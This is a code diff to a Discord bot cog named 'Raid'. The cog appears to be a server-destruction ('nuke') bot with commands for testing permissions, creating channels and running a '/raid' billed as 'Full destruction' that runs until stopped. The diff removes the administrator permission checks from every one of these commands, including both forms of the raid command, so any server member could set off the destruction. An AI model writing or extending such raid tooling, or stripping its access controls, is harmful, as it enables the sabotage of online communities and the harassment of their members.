@@ -98,7 +98,6 @@ class Raid(commands.Cog):
     # /testperms
     # ─────────────────────────────────────────────────────────────────────────
     @app_commands.command(name="testperms", description="Check bot permissions in this server.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def testperms(self, interaction: discord.Interaction) -> None:
         await interaction.response.defer(ephemeral=True)
@@ -125,7 +124,6 @@ class Raid(commands.Cog):
     # /testcreate
     # ─────────────────────────────────────────────────────────────────────────
     @app_commands.command(name="testcreate", description="Try to create one test channel and report exact result.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def testcreate(self, interaction: discord.Interaction) -> None:
         await interaction.response.defer(ephemeral=True)
@@ -190,7 +188,6 @@ class Raid(commands.Cog):
 
     # ── /raid ──────────────────────────────────────────────────────────────────
     @app_commands.command(name="raid", description=f"☠️ Full destruction — {RAID_TAG}. Runs until /stop.")
-    @app_commands.checks.has_permissions(administrator=True)
     @app_commands.guild_only()
     async def raid(self, interaction: discord.Interaction) -> None:
         await interaction.response.defer()
@@ -199,7 +196,6 @@ class Raid(commands.Cog):
 
     # ── .raid ──────────────────────────────────────────────────────────────────
     @commands.command(name="raid")
-    @commands.has_permissions(administrator=True)
     @commands.guild_only()
     async def raid_prefix(self, ctx: commands.Context) -> None:
         await ctx.send("There is no going back now son 😔")
